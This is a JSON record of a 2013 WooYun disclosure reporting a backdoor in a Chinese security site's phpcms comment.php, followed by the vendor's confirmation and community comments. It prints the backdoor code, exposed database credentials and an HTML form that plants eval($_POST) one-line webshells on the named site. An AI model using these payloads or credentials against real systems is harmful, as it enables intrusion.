{"id": 6961, "wybug_id": "wooyun-2013-043481", "wybug_title": "红黑联盟官网被人恶意留下后门", "wybug_corp": "红黑联盟", "wybug_author": "西毒", "wybug_date": "2013-11-20 17:35", "wybug_open_date": "2014-01-04 17:36", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向公众公开  简要描述：  详细说明：  无意读到源码发现你们网站被人留下了后门如F:\\honhei\\www\\phpcms\\comment.php中\ntransitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" /><meta http-equiv=\"X-UA-Compatible\" content=\"IE=7\" /><title>phpcmsV9 - 后台管理中心</title><link href=\"http://www.2cto.com/statics/css/reset.css\" rel=\"stylesheet\" type=\"text/css\" /><link href=\"http://www.2cto.com/statics/css/zh-cn-system.css\" rel=\"stylesheet\" type=\"text/css\" /><link href=\"http://www.2cto.com/statics/css/table_form.css\" rel=\"stylesheet\" type=\"text/css\" /><link href=\"http://www.2cto.com/statics/css/dialog.css\" rel=\"stylesheet\" type=\"text/css\" /></head><?phpif (@$_GET['act'] == 'save'){\t$input=@$_POST['Qdata'];\t$input = \"<?php \\n\".$input.\"?>\";\t$fp=fopen(\"../CommentPZ.php\",\"wb\");\tfwrite($fp,$input);\tfclose($fp);\techo '<script>alert(\"保存成功\")</script>';}$server = \"localhost\";  $sa = \"zhengheyonghu\";  $password=\"2bCHmZTsb5CBMRRB\";  $phpcms =\"zhuzhan2cto\";  $phpwind=\"cto2luntan\";if(!$mssql_phpcms = @mysql_connect($server,$sa,$password)){\texit(\"MYSQL链接失败\");}$fp=fopen(\"../CommentPZ.php\",\"r\");$output=fread($fp,filesize(\"../CommentPZ.php\"));fclose($fp);$output = str_replace('<?php','',$output);$output = str_replace('?>','',$output);?>\n这里是2012年修改的，不知道是之前被人入侵留下的还是自己为了方便留下的呢？ 我表示非我留下的\n\n红黑是老的站点，安全还是做好吧，估计被他人恶意攻击的话，首页可能就不保了。\n\n建议将目录权限设置死，以前我在微博上就你们管理说过，可是没回应。像这样的后门，都不知道什么时候留下的，自己还一直活在精彩的世界里？最后给出上面后门的exp，非常简单访问之后生成一个一句话，访问即可www.2cto.com/CommentPZ.php    <form action=\"http://www.2cto.com/phpcms/comment.php?act=save\" method=\"post\"><!--         <input type=\"hidden\" value=\"eval($_POST[cmd]);\" name=\"Qdata\">        <input type=\"hidden\" value=\"2.php\" name=\"title\">        <input type=\"hidden\" value=\"<?php eval($_POST[xd]);?>\" name=\"newsort\">        <input type=\"submit\" name=\"submit\" value=\"fuck\" style=\"margin-top:5px; height:28px;\">    </form>向你们反馈这个漏洞，20分应该不为高吧？   漏洞证明：  \n\n   修复方案：  这个检查下代码就好了，然后各目录权限设置好,以前微博上私信给你们，可是没得到回应，囧   版权声明：转载请注明来源 西毒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-11-23 12:14 厂商回复： 多谢，虽然没注意过微薄的通知，但是这个后门我几次发现都没有注意到。我们做开发时某程序猿自己写了这么个玩意，后来不用了也没有删除。好几年了，终于被你挖出来了。麻烦告知我一下你是如何发现的，顺便有点站内的纪念品发送。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-20 17:51 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  哈哈 黑吃黑 常在河边走哪能不湿鞋？？    \n     2013-11-20 17:52 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  西毒牛你还是直接把你的v9 getshell放出来吧，不带这样刷rank的 T_T    \n     2013-11-20 17:54 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @saline  真没....大哥....没唬你    \n     2013-11-20 18:05 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  刷rank哥    \n     2013-11-20 20:16 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  求get shell啊    \n     2013-11-20 22:36 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:51        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  @孤独雪狼  貌似大哥你是运维额    \n     2013-11-21 01:19 |    \t\tw5r2 \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:52        )\t\t \n  呵呵    \n     2013-11-23 12:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  据说是帮你审计源代码的时候发现的    \n     2013-11-23 12:35 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @xsser 额，是翻代码的时候发现的，这程序猿明显就是为了留后门    \n     2013-11-23 21:00 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  ╮(╯_╰)╭誒    \n     2013-11-24 13:52 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @西毒 难道红黑是的代码是开源的？此话暴露了....    \n     2014-01-04 22:17 |    \t\tsea \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | 好人)\t\t \n  我发了个免费成为2CTO会员的一直不审核，哎。    \n     2014-01-06 10:48 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  @sea 如何能免费成2cto会员呢    \n     2014-01-06 15:57 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  @孤独雪狼  也一直没看到你们给的礼物。。。。不会是直接套了俺地址吧    \n     2014-01-06 19:41 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  @西毒 稍等 我问问看     \n     2014-05-16 20:45 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  挖到红黑联盟的漏洞那就爽了！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}